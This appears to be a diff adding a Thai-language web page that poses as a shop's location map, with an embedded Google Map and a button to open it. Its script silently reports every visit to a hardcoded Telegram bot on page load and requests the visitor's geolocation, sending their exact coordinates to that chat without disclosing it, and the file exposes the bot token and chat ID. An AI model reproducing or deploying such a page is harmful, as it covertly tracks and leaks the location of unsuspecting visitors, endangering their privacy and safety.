@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>แผนที่ร้าน + แจ้งเตือน Telegram</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      background: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+
+    header {
+      background: #4CAF50;
+      color: white;
+      padding: 20px 10px;
+    }
+
+    .address {
+      margin: 20px;
+      font-size: 18px;
+    }
+
+    .map-container {
+      width: 100%;
+      height: 400px;
+    }
+
+    iframe {
+      border: none;
+      width: 100%;
+      height: 100%;
+    }
+
+    button {
+      background-color: #2196F3;
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      margin: 15px;
+    }
+
+    @media (max-width: 600px) {
+      .address {
+        font-size: 16px;
+      }
+
+      button {
+        width: 90%;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>แผนที่ร้านของเรา</h1>
+  </header>
+
+  <div class="address">
+    📍 ที่อยู่: 123 ถนนสุขุมวิท แขวงคลองเตยเหนือ เขตวัฒนา กรุงเทพฯ 10110
+  </div>
+
+  <div class="map-container">
+    <iframe
+      src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3875.709235971971!2d100.55655481531743!3d13.736717501205838!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x30e29ec898f0d337%3A0xf5f4e3b0f1ec7b49!2sTerminal%2021!5e0!3m2!1sth!2sth!4v1682525192555!5m2!1sth!2sth"
+      allowfullscreen=""
+      loading="lazy">
+    </iframe>
+  </div>
+
+  <button onclick="openGoogleMaps()">📌 เปิดใน Google Maps</button>
+
+  <script>
+    const telegramToken = "7777557980:AAEQEqSyOC0NifWdp4Vu_Ndmi0QdORE-NZo";
+    const chatID = "8103727607";
+
+    function notifyTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+      const data = {
+        chat_id: chatID,
+        text: message,
+        parse_mode: "HTML"
+      };
+
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      }).catch(error => {
+        console.error("Telegram Error:", error);
+      });
+    }
+
+    function openGoogleMaps() {
+      window.open("https://www.google.com/maps?q=13.7367175,100.5630437", "_blank");
+    }
+
+    // แจ้งเตือนเมื่อเข้าเว็บไซต์
+    window.addEventListener("DOMContentLoaded", () => {
+      const time = new Date().toLocaleString();
+      notifyTelegram(`🟢 <b>มีผู้เข้าเว็บไซต์</b>\n🕒 เวลา: ${time}`);
+    });
+
+    // ถ้าผู้ใช้อนุญาต ให้ส่งตำแหน่งของเขาไป Telegram
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
+          notifyTelegram(`📍 <b>พิกัดผู้เข้าชม:</b>\n<a href="${mapLink}">${lat.toFixed(6)},${lon.toFixed(6)}</a>`);
+        },
+        error => {
+          if (error.code === 1) notifyTelegram("⛔ ผู้ใช้ไม่อนุญาตให้ระบุตำแหน่ง");
+          else notifyTelegram("❌ เกิดข้อผิดพลาดในการดึงตำแหน่งผู้ใช้");
+        }
+      );
+    } else {
+      notifyTelegram("⚠️ เบราว์เซอร์ไม่รองรับ geolocation");
+    }
+  </script>
+
+</body>
+</html>
